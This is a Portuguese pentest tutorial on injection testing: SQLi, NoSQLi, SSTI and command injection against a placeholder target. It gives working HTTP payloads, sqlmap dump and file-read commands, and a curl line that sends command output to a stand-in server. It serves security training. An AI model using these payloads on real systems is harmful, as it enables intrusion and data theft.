## FASE 3 — Testes de Injeção (SQLi, NoSQLi, SSTI, Command Injection)

**Tempo estimado:** 90-120 minutos
**Objetivo:** Testar TODAS as formas de injeção nos parâmetros de entrada. Injeção é a vulnerabilidade mais devastadora — leitura de banco, execução de comandos e takeover do servidor.
**Por quê:** Se o input do usuário chega a um banco de dados, template engine ou shell sem sanitização, existe risco de injeção. Cada parâmetro de `09-descoberta/parametros.txt` é um candidato.

> **📡 Herança das fases anteriores:** candidatos diretos em `08-alimentacao/params-web.txt` (recon — ← MANUAL-RECON `04-discovery/urls-com-parametros.txt`) e `09-descoberta/parametros.txt` (Fase 2). **Teoria aprofundada:** conteúdo do Módulo 02 — `02-injecao-e-fuzzing.md` e `04-nosql-injection.md`.

> **⚠️ ATENÇÃO:** rode SQLMap com `--risk=1` por padrão. `--risk=3` inclui payloads que podem ALTERAR dados (`UPDATE`/`DELETE`) — só com autorização explícita (ver 06-opsec.md).

---

## 3A: SQL Injection (SQLi)

### Passo 3A.1 — Teste Básico de SQLi

**O que você vai fazer:** Injetar SQL básico em um parâmetro para ver se a aplicação processa consulta sem sanitização.

**No Burp Repeater:**
1. No HTTP history, encontre um GET com parâmetro (ex: `/api/users?id=1`)
2. Clique direito → **Send to Repeater**
3. Modifique o parâmetro:

```http
GET /api/users?id=1' OR '1'='1 HTTP/1.1
Host: evilcorp.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
Content-Type: application/json

{"users": [
  {"id": 1, "name": "Admin", "role": "admin"},
  {"id": 2, "name": "User1", "role": "user"},
  {"id": 3, "name": "User2", "role": "user"}
]}
```

**O que procurar:** resposta com MAIS dados que o original. `?id=1` deveria retornar 1 usuário e retornou vários → vulnerável.

**✅ NÃO vulnerável:**
```
HTTP/1.1 400 Bad Request
{"error": "Invalid input"}
```
ou a resposta idêntica ao original.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Erro 500 | Sintaxe SQL errada | `1' OR 1=1--`, `1' AND '1'='1` |
| 403 | WAF bloqueando | Encoding: `1%27%20OR%20%271%27%3D%271` |
| 200 com dados iguais | Parâmetro não é SQL | Próximo parâmetro da Fase 2 |

---

### Passo 3A.2 — UNION Attack (extrair dados de outras tabelas)

**Passo 3A.2.1 — Número de colunas:** aumente até dar erro:
```http
GET /api/users?id=1' ORDER BY 1-- HTTP/1.1
...
GET /api/users?id=1' ORDER BY 5-- HTTP/1.1
```
`ORDER BY 5` erro + `ORDER BY 4` ok → **4 colunas**.

**Passo 3A.2.2 — Confirmar:**
```http
GET /api/users?id=1' UNION SELECT NULL,NULL,NULL,NULL-- HTTP/1.1
```
200 OK sem erro → número correto.

**Passo 3A.2.3 — Extrair dados:**
```http
GET /api/users?id=-1' UNION SELECT username,password,NULL,NULL FROM users-- HTTP/1.1
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"users": [
  {"username": "admin", "password": "5f4dcc3b5aa765d61d8327deb882cf99"},
  {"username": "user1", "password": "25d55ad283aa400af464c76d713c07ad"}
]}
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| UNION retorna erro | Colunas erradas | Mais/menos NULLs |
| Dados vazios | Colunas incompatíveis | `UNION SELECT 'a',NULL,NULL,NULL--` |
| WAF bloqueia | Filtro de keywords | `uNiOn SeLeCt` (case) ou encoding |

---

### Passo 3A.3 — Confirmar com SQLMap

**Passo 3A.3.1 — Instalar e testar:**
```bash
sudo apt install sqlmap -y
sqlmap --version   # esperado: sqlmap 1.8.x

sqlmap -u "https://evilcorp.com/api/users?id=1" --batch --risk=1 --level=2
```

| Flag | Função |
|------|--------|
| `-u "URL"` | URL alvo |
| `--batch` | responde "yes" automático |
| `--risk=1` | payloads seguros (sem UPDATE/DELETE) |
| `--level=2` | testa mais parâmetros/payloads (máx 5) |

**📡 Conexão direta ao banco (Módulo 01):** se `02-enum/nmap-services.txt` mostra MySQL/PostgreSQL exposto (3306/5432), tente `sqlmap -h <IP> -p 3306` — bancos expostos frequentemente têm credencial padrão.

**✅ Output esperado (VULNERÁVEL):**
```
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] testing 'MySQL >= 5.0 AND error-based'
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `not injectable` | Parâmetro seguro | Outros parâmetros ou `--level=5 --risk=2` |
| Rate limiting | WAF | `--delay=1 --random-agent` |
| connection reset | WAF/firewall | `--proxy=http://127.0.0.1:8080` (pelo Burp) |
| Muito lento | Muitos payloads | `--technique=BEU` (Boolean, Error, Union) |

**Passo 3A.3.4 — Enumerar e extrair:**
```bash
# Bancos
sqlmap -u "https://evilcorp.com/api/users?id=1" --batch --dbs | tee 10-injecao/sqlmap-dbs.txt

# Tabelas
sqlmap -u "https://evilcorp.com/api/users?id=1" --batch -D targetdb --tables

# Dump (⚠️ dados reais — documente, não distribua)
sqlmap -u "https://evilcorp.com/api/users?id=1" --batch -D targetdb -T users --dump | tee 10-injecao/sqlmap-dump.txt

# Ler arquivo (só MySQL com privilégio FILE)
sqlmap -u "https://evilcorp.com/api/users?id=1" --batch --file-read=/etc/passwd
```

**✅ Output esperado (--dbs):**
```
available databases [3]:
[*] information_schema
[*] mysql
[*] targetdb
```

---

### Passo 3A.4 — SQLi em Headers

```http
GET /api/users HTTP/1.1
Host: evilcorp.com
X-Forwarded-For: 1' OR '1'='1
User-Agent: ' OR '1'='1
Referer: ' OR '1'='1
```

Envie cada header individualmente no Repeater e compare as respostas. Response diferente → candidato a SQLi.

**❌ Se der errado:** todos iguais → headers não entram em query; siga para POST/GET.

---

### Passo 3A.5 — Blind SQLi

**Boolean** — primeira com dados, segunda sem → VULNERÁVEL:
```http
GET /api/users?id=1' AND 1=1-- HTTP/1.1
GET /api/users?id=1' AND 1=2-- HTTP/1.1
```

**Time-based** — resposta demora 5s → VULNERÁVEL:
```http
GET /api/users?id=1' AND SLEEP(5)-- HTTP/1.1
```

**Extração letra a letra:**
```http
GET /api/users?id=1' AND SUBSTRING((SELECT database()),1,1)='a'-- HTTP/1.1
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| SLEEP não funciona | thread_pool | `BENCHMARK(10000000,SHA1('test'))` |
| Boolean sempre igual | Resposta estável | Compare o HTML completo (diff) |
| Muito lento | Muitas iterações | `sqlmap --technique=T --time-sec=2` |

---

## 3B: NoSQL Injection

### Passo 3B.1 — Teste Básico (MongoDB)

```http
POST /api/login HTTP/1.1
Host: evilcorp.com
Content-Type: application/json

{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"token": "eyJhbGciOiJIUzI1NiIs..."}
```

`$gt` retorna todos os documentos → bypass de autenticação se devolveu token.

### Passo 3B.2 — NoSQLi via URL Parameter

```http
GET /api/users?filter[$ne]= HTTP/1.1
Host: evilcorp.com
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Erro 400 | JSON não aceito em GET | POST com `Content-Type: application/json` |
| `$gt` não funciona | Input sanitizado | `$regex`, `$exists`, `$nin` |
| Não é NoSQL | É SQL puro | Volte para 3A |

---

## 3C: Server-Side Template Injection (SSTI)

### Passo 3C.1 — Teste Básico

```http
GET /api/render?name={{7*7}} HTTP/1.1
Host: evilcorp.com
```

- **`49`** → VULNERÁVEL (template processou a expressão)
- **`{{7*7}}` literal** → não vulnerável

### Passo 3C.2 — Identificar Template Engine

```http
GET /api/render?name={{7*'7'}} HTTP/1.1
```

| Output | Engine | Linguagem |
|--------|--------|-----------|
| `49` | Twig | PHP |
| `7777777` | Jinja2 | Python |
| literal | Freemarker/Velocity | Java (não vuln) |

### Passo 3C.3 — Exfiltrar Dados (Jinja2)

```http
GET /api/render?name={{config.items()}} HTTP/1.1
```

**✅ VULNERÁVEL:**
```
{"rendered": "[('SECRET_KEY', 'abc123'), ('DATABASE_URI', 'mysql://...')]"}
```

Procure `SECRET_KEY`, `DATABASE_URI`, API keys.

**❌ Se der errado:** `{{7*7}}` literal → sandbox; tente `{{config}}`; erro 500 → payload complexo demais, comece simples.

---

## 3D: OS Command Injection

### Passo 3D.1 — Teste Básico

```http
GET /api/ping?host=127.0.0.1;id HTTP/1.1
Host: evilcorp.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"result": "PING 127.0.0.1 ...\nuid=33(www-data) gid=33(www-data) groups=33(www-data)"}
```

O `id` apareceu junto do ping → **RCE confirmado.**

### Passo 3D.2 — Outros Separadores

Teste TODOS: `127.0.0.1|id`, `127.0.0.1||id`, `127.0.0.1&&id`, ``127.0.0.1`id` ``, `127.0.0.1$(id)`.

### Passo 3D.3 — Exfiltrar Dados

```http
GET /api/ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1
```

**✅ VULNERÁVEL:** conteúdo de `/etc/passwd` na resposta.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Nenhum separador | WAF/filtro | Encoding: `%3B` (;), `%7C` (\|) |
| Comando não executa | exec() seguro | Time-based: `$(sleep 5)` |
| Saída não aparece | Blind | Out-of-band: `curl http://SEU-SERVIDOR/?d=$(whoami)` (Burp Collaborator) |

---

### Checklist da Fase 3

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | SQLi testado em parâmetros GET | `10-injecao/sqli-test.txt` | [ ] |
| 2 | UNION attack executado | `10-injecao/sqli-union.txt` | [ ] |
| 3 | SQLMap executado | `10-injecao/sqlmap-results.txt` | [ ] |
| 4 | Databases enumerados | `10-injecao/sqlmap-dbs.txt` | [ ] |
| 5 | SQLi testado em headers | `10-injecao/sqli-headers.txt` | [ ] |
| 6 | Blind SQLi testado | `10-injecao/blind-sqli.txt` | [ ] |
| 7 | NoSQLi testado (se API JSON) | `10-injecao/nosqli.txt` | [ ] |
| 8 | SSTI testado | `10-injecao/ssti.txt` | [ ] |
| 9 | Command Injection testado | `10-injecao/cmdi.txt` | [ ] |

### ✅ Sinal de sucesso:
- Pelo menos **uma injeção confirmada** (SQLi, NoSQLi, SSTI ou CMDi) OU
- **≥ 5 parâmetros diferentes** testados com payloads básicos (alvo pode ser seguro nestes vetores)

### ❌ Se falhou:
- Nenhuma injeção → teste outros parâmetros da Fase 2; confirme se o WAF não está engolindo payloads (veja 06-opsec.md)
- Mínimo para avançar: 5 parâmetros testados com os payloads desta fase

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 3 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `sqli-test.txt` | Fase 6 (Validação) | Confirmar exploit reproduzível |
| `sqlmap-results.txt` / `sqlmap-dump.txt` | Fase 7 (Relatório) | Documentar dados acessados (sem expor) |
| `cmdi.txt` | Fase 6 | Confirmar RCE |
| `ssti.txt` | Fase 7 | Documentar template injection |

**Se completou tudo → Avance para [Fase 4 — Cliente e Autenticação](10-fase4-cliente-auth.md)**

---

## Mini-Checkpoint: SQLi em um Lab

1. Lab "SQL injection vulnerability in WHERE clause": https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
2. Use o Burp Repeater para testar `' OR 1=1--`
3. Confirme que retornou dados extras
4. Tente UNION SELECT para extrair dados de outras tabelas

**Se conseguiu resolver → avance. Se não → revise os passos acima.**
